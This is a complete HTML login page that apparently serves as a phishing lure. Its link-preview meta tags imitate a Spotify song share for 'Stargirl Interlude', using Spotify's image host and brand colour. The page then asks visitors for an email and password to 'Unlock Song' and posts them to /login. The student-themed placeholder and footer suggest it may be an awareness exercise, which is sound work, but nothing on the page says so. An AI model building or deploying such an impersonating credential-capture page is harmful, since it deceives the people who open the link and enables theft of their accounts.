<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Music Portal | Login</title>
    <link rel="stylesheet" href="style.css">
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600&display=swap" rel="stylesheet">

    <!-- Spotify Link Preview Tags -->
    <meta property="og:title" content="Spotify – Stargirl Interlude">
    <meta property="og:description" content="Listen to Stargirl Interlude on Spotify">
    <meta property="og:image" content="https://i.scdn.co/image/ab67616d0000b2734718e2b7e4ba63d00adb105b">
    <meta property="og:type" content="music.song">
    <meta name="theme-color" content="#1DB954">
</head>

<body>
    <div class="background">
        <div class="circle"></div>
        <div class="circle"></div>
    </div>
    <div class="login-container">
        <div class="glass-box">
            <div class="header">
                <div class="logo">
                    <svg viewBox="0 0 24 24" width="40" height="40" stroke="currentColor" stroke-width="2" fill="none"
                        stroke-linecap="round" stroke-linejoin="round" class="css-i6dz6n">
                        <path d="M9 18V5l12-2v13"></path>
                        <circle cx="6" cy="18" r="3"></circle>
                        <circle cx="18" cy="16" r="3"></circle>
                    </svg>
                </div>
                <h1>Exclusive Access</h1>
                <p>Login to listen to <span>Stargirl Interlude</span></p>
            </div>
            <form action="/login" method="POST">
                <div class="input-group">
                    <label for="email">Email Address</label>
                    <input type="email" id="email" name="email" placeholder="students@example.com" required>
                </div>
                <div class="input-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" placeholder="••••••••" required>
                </div>
                <button type="submit" class="login-btn">
                    <span>Unlock Song</span>
                    <svg viewBox="0 0 24 24" width="20" height="20" stroke="currentColor" stroke-width="2" fill="none"
                        stroke-linecap="round" stroke-linejoin="round" class="css-i6dz6n">
                        <polyline points="9 18 15 12 9 6"></polyline>
                    </svg>
                </button>
            </form>
            <div class="footer">
                <p>Limited student access portal</p>
            </div>
        </div>
    </div>
</body>

</html>
